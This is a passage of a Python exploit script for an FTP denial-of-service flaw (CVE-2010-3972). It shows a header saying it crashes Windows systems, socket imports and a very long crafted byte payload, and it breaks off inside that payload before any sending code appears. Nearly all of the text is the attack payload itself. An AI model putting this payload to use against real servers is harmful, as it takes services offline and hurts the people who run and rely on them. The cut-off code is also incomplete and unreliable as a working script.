#######################################################
# FTP DoS
# CVE-2010-3972
# Reference: https://www.exploit-db.com/exploits/15803
#
# This exploit makes use of a known DoS vulnerability
# to crash the Windows system.
#######################################################

from utils import Exploit
import time
import socket, sys

payload = b'\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\xef\x83\xb0\x31\x34\x34\x39\x38\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xfe\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xfe\xff\xff\xef\xfe\xff\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xfe\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff\xef\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xfe\xff\xff\xef\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xff\xef\xfe\xff\xfe\xff\xfe\xff\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xfe\xff\xff\xef\xff\xef\xfe\xff\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xef\xbb\xbf\xff\xef\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xfe\xff\xef\xbb\xbf\xff\xef\xfe\xff\xef\xbb\xbf\xfe\xff\xff\xef\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xff\xef\xff\xef\xff\xef\xef\xbb\xbf\xef\xbb\xbf\xfe\xff\xef\xbb\xbf\xef\xbb\xbf\xff\xef\xef\xbb\xb